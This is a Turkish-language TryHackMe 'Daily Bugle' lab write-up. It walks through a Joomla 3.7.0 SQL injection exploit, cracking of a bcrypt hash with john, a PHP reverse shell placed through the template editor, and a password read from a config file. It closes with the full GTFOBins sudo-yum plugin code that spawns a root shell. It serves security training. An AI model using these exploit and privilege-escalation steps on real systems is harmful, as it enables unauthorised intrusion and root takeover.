---
title: 'TryHackMe | Daily Bugle WriteUp'
author: appdone
categories: [TryHackMe Challenges]
tags: [sql injection, sudo]
render_with_liquid: false
media_subpath: /images/tryhackme_daily_bugle/
image:
  path: logo.webp
---

## Özet

Daily Bugle, SQL injection zafiyetli eklentiye sahip olan bir joomla uygulamasıdır. Bu zafiyete özel olarak hazırlanmış bir sömürü aracından faydalanarak kullanıcı bilgilerini elde edeğiz. Daha sonra bu bilgileri kullanarak içerik yönetim sistemine giriş yapacak ve temalar kısmından php reverse shell kodumuzu yükleyeceğiz. Bağlantı sonrasında ise joomla'nın konfigürasyon dosyasınından bir kullanıcının parolasını alacak ve onun hesabına geçeceğiz. Sonra da root haklarıyla çalıştırabileceğimiz yum aracı için bir eklenti yazacak ve çalıştırdıktan sonra root haklarına sahip olacağız.

## Keşif aşaması

### Nmap taraması

![](1.webp){: width="1200" height="600" }

Tarama sonucunda 22 (SSH), 80 (HTTP) ve 3306 (Mysql) numaralı portların açık olduğunu öğreniyoruz. Mysql servisine yetkisiz olarak bağlanabileceğimi düşündüm. Ancak bağlanmaya çalıştığımda `ERROR 2002 (HY000)` hatası ile karşılaştım. HTTP servisinden devam edelim.

### 80 numaralı port'un incelenmesi

![](2.webp){: width="1200" height="600" }

Web uygulamasında örümcek adamın hırsızlık yaptığı bir haber paylaşılmış. Haberi paylaşan kişinin ismi `Super User`. Uygulamanın favicon dosyasına baktığımızda `joomla` içerik yönetim sisteminin kullanıldığını öğreniyoruz. Joomscan aracını kullanarak hedef uygulamayı tarayalım.

```console
$ joomla -u 10.10.19.236
...
[+] Detecting Joomla Version                                                                                                                                                                  
[++] Joomla 3.7.0 
...
```

Tarama sonucunda içerik yönetim sisteminin 3.7.0 sürümünü kullandığını öğrendik. Adını ve sürümünü google da arattıktan sonra [bu](https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py) exploit ile karşılaşıyoruz.

## Sömürü aşaması

Exploit'i indirdikten sonra çalıştırıyor ve kullanıcı bilgilerini elde ediyoruz.

```console
$ python3 joomblah.py http://10.10.19.236/
...
[-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

Elde ettiğimiz hash'i john aracının yardımıyla kıralım.

```console
$ john hash -w=Desktop/rockyou.txt 
[sudo] password for appdone: 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s***3    (?)
...
```

Kullanıcı bilgilerini kullanarak SSH servisine bağlanmayı denedim ama olmadı. Daha sonra joomla paneline giriş yaptıktan sonra temalar kısmından ana sayfaya php shell kodumu girdim.

![](3.webp){: width="1200" height="600" }

Kayıt ettikten sonra "Template Preview" butonuna tıkladığımızda reverse shell kodunu çalıştırıyor ve sisteme ilk adımımızı atıyoruz.

## Yetki yükseltme

### jjameson

Joomla uygulamasının konfigürasyon dosyasının içerisinden `jjameson` kullanıcısının parolasını alıyoruz.

```console
bash-4.2$ cat configuration.php
public $dbtype = 'mysqli';                                                                                                                                                            
public $host = 'localhost';                                                                                                                                                           
public $user = 'root';                                                                                                                                                                
public $password = 'nv5uz9r3ZEDzVjNu';                                                                                                                                                
public $db = 'joomla';
```

Kullanıcıya geçiş yaptıktan sonra ilk bayrağı kendi dizininden alıyoruz.

# root

`sudo -l` komutunu kullandıktan sonra yum aracını parola gerektirmeden ve tüm kullanıcılar adına çalıştırabileceğimizi öğreniyoruz.

```console
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

yum aracını kullanarak nasıl yetki yükseltebileceğimizi öğrenmek için [GTFOBins](https://gtfobins.github.io/gtfobins/yum/#sudo) sitesinden faydalanıyoruz. Oradan aldığımız komutu sistemde çalıştırdıktan sonra root yetkisinde bir shell'e sahip oluyoruz.

```
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

Bu komut yığını root kullanıcısına geçiş yapabilmemiz için bir eklenti oluşturuyor. Eklentileri aktif ettikten sonra belirtilen eklenti adresinden eklentiyi alıp çalıştırıyor, böyleye root haklarına sahip bir shell elde ediyoruz.
